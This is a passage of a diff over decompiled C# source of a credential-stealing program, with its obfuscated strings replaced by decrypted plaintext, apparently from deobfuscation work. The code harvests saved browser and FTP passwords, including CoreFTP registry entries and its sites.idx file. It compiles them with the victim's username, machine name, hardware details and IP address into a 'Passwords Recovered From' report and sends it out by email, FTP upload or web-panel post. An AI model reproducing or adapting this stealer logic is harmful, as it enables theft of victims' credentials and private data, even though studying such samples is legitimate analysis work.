-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3775,7 +3960,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -3799,7 +3988,7 @@ internal sealed class N
 		try
 		{
 			object obj14 = AEM.RY();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj14, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj14, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator17 = default(IEnumerator);
 				try
@@ -3816,7 +4005,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3847,7 +4040,7 @@ internal sealed class N
 		try
 		{
 			object obj15 = AEM.PVO();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj15, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj15, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator18 = default(IEnumerator);
 				try
@@ -3864,7 +4057,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3905,7 +4102,11 @@ internal sealed class N
 				{
 					if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 					{
-						stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+						stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 					}
 					else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 					{
@@ -3927,7 +4128,7 @@ internal sealed class N
 		try
 		{
 			object obj16 = AEM.FJ();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj16, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj16, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator19 = default(IEnumerator);
 				try
@@ -3944,7 +4145,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -3975,7 +4180,7 @@ internal sealed class N
 		try
 		{
 			object obj17 = AEM.GJ();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj17, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj17, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator20 = default(IEnumerator);
 				try
@@ -3992,7 +4197,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -4034,7 +4243,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -4068,7 +4281,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -4091,7 +4308,7 @@ internal sealed class N
 		try
 		{
 			object obj18 = AEM.UDQ();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj18, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj18, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator23 = default(IEnumerator);
 				try
@@ -4108,7 +4325,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -4138,14 +4359,14 @@ internal sealed class N
 		}
 		try
 		{
-			string kH_ = Interaction.Environ(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("4TAOpYvRtTG3ssTwK4ma4sFhCu5SID5jBdiG744/qOY=");
+			string kH_ = Interaction.Environ("APPDATA") + @"\CoreFTP\sites.idx";
 			string str = S_.TG(kH_);
-			string text = S_.DD(O.I("kwTbWGPthx54z7ItP6ZZgGTzcfyiRbHbJ8Xm4KgBr1zGZHArT3bc+XcLucE82M2abHHDCxscokOXYDUshjweVw==") + str + O.I("w6O5o59OxPOdNfoFFDv9Vg=="));
-			string text2 = S_.DD(O.I("kwTbWGPthx54z7ItP6ZZgC9T5GX5tlxzFgXJIvCE0uES5VPzgGrSnG3K/lJOBL1m") + str + O.I("Ycgrb6PLHSwxctjm8V+U0g=="));
-			string text3 = S_.DD(O.I("kwTbWGPthx54z7ItP6ZZgC9T5GX5tlxzFgXJIvCE0uES5VPzgGrSnG3K/lJOBL1m") + str + O.I("B6UJuSMiPSa02PYTuv9Jcg=="));
-			string text4 = S_.DD(O.I("kwTbWGPthx54z7ItP6ZZgC9T5GX5tlxzFgXJIvCE0uES5VPzgGrSnG3K/lJOBL1m") + str + O.I("/NjjK2/CTXiUqveQWXmasQ=="));
-			string text5 = S_.DD(O.I("kwTbWGPthx54z7ItP6ZZgC9T5GX5tlxzFgXJIvCE0uES5VPzgGrSnG3K/lJOBL1m") + str + O.I("kkzyKhhxe0N+EYGYxKqD/A=="));
-			string browser = O.I("byzWbxhZH2XQb9hWWUSwqg==");
+			string text = S_.DD(@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" + str + "Host");
+			string text2 = S_.DD("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str + "Port");
+			string text3 = S_.DD("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str + "User");
+			string text4 = S_.DD("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str + "PW");
+			string text5 = S_.DD("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str + "Name");
+			string browser = "CoreFTP";
 			string uRL = text;
 			string userName = text3;
 			string password = text4;
@@ -4153,7 +4374,11 @@ internal sealed class N
 			{
 				if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 				{
-					stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+					stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 				}
 				else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 				{
@@ -4185,7 +4410,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -4219,7 +4448,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -4242,7 +4475,7 @@ internal sealed class N
 		try
 		{
 			object obj19 = AEM.FDL();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj19, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj19, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator26 = default(IEnumerator);
 				try
@@ -4259,7 +4492,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -4290,7 +4527,7 @@ internal sealed class N
 		try
 		{
 			object obj20 = AEM.GMF();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj20, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj20, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator27 = default(IEnumerator);
 				try
@@ -4307,7 +4544,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -4338,7 +4579,7 @@ internal sealed class N
 		try
 		{
 			object obj21 = AEM.XN();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj21, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj21, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator28 = default(IEnumerator);
 				try
@@ -4355,7 +4596,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -4397,7 +4642,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -4431,7 +4680,11 @@ internal sealed class N
 					{
 						if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 						{
-							stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+							stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 						}
 						else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 						{
@@ -4453,7 +4706,7 @@ internal sealed class N
 		}
 		try
 		{
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(S_.VC.LP(), null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(S_.VC.LP(), null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator31 = default(IEnumerator);
 				try
@@ -4470,7 +4723,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -4501,7 +4758,7 @@ internal sealed class N
 		try
 		{
 			object obj22 = AEM.CM();
-			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj22, null, O.I("1rFXNQd9jNhZ7HixzgoKJA=="), new object[0], null, null, null), 0, false))
+			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj22, null, "Count", new object[0], null, null, null), 0, false))
 			{
 				IEnumerator enumerator32 = default(IEnumerator);
 				try
@@ -4518,7 +4775,11 @@ internal sealed class N
 						{
 							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 							{
-								stringBuilder2.Append(string.Format(O.I("FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA=="), browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
+								stringBuilder2.Append(string.Format(@"
+client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
 							}
 							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
 							{
@@ -4552,9 +4813,9 @@ internal sealed class N
 			{
 				try
 				{
-					string iMW_ = SystemInformation.UserName + O.I("eCqe8oqjGUIRwUWqnBrrpA==") + SystemInformation.ComputerName + O.I("QLZGY78+zXUNT2jX7mlgXD+0Zy9QfeBN/YljDjfOrSU=") + GO_71;
-					string hS_ = O.I("uNywgp3gcTTyKeIZNvtRFqDBnfUV92CQGHMsBMNEJEAOrU7d7MDLECDC0eY2zvS+RLxYKLxfIdRbffu2teOmyW+bpCfzG3tWFI35VVVduzAC2UTKPI3G+FFWlOe4MuHsqRBPFsMUzS+hvasThCodGqjQQsD5nq8mDKhfSC2GwvzScWOEowAiGyNv+0uoRhoXiKNK3rW4mFF5WcuCEqvxtcWP9lF8j1MCIEToLuId3PdK5uW6E5e+6PBBBNrqD9J/") + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + stringBuilder.ToString() + O.I("82ZGUDSQrPCv8v1Hf+HpRA==");
-					MV(O.I("Y8DAKcz8EsJeHhP0Z+gY3A=="), iMW_, hS_);
+					string iMW_ = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Passwords Recovered From: " + GO_71;
+					string hS_ = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + stringBuilder.ToString() + "</span>";
+					MV("%toemail%", iMW_, hS_);
 				}
 				catch (Exception projectError)
 				{
@@ -4565,10 +4826,10 @@ internal sealed class N
 			}
 			else if (Operators.CompareString(WEL_46, "ftp", false) == 0)
 			{
-				string format2 = O.I("I/tDnJPWEB6yySAivkY/576ixyY2gOP+bLVbbaRIV8A=");
+				string format2 = "yyyy_MM_dd_HH_mm_ss";
 				try
 				{
-					JP(O.I("A1PTwV76u4Vgp49jh17ShYXIVFBSFLljZpz4qEan9tA=") + LR_70.Replace(O.I("eCqe8oqjGUIRwUWqnBrrpA=="), O.I("q542gy/+wDIUJhH3OGKnNg==")) + O.I("3TzIyOOSC+3lcpPaeTxO6g==") + DateTime.Now.ToString(format2) + O.I("4T5LGk6qEvqUS2xRJLUlww=="), O.I("yN4uMqCl2degCjnj4AuHbO5vNBAmbfUDS0u7etQ1RdNOLEn+BjzrAMNth43QwEFJ8tRPmeHfdsHnW/LmiJ6W9fU+yLxYup6Gq4UA3ctDZ6tBGoBahiCVlkKBNbpmbE/N2pTXeVJ2qlmH45HhNW2EfFF8iE0CbEq6PmD8kFUlLhsCoPcZB/kCjL0LNCYqfV/tArIzwh0vhTtaIcZ1swa02qgQrNEILjcrgB4zolqeykDR72Zbhbs9dMitps7QGYyl") + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + stringBuilder.ToString() + O.I("QPOSOv+tW8xdwNqY8eTkUw=="));
+					JP("Password_Recoveries_" + LR_70.Replace("/", "-") + "_" + DateTime.Now.ToString(format2) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + stringBuilder.ToString() + "</span></html>");
 				}
 				catch (Exception projectError2)
 				{
@@ -4595,7 +4856,7 @@ internal sealed class N
 		{
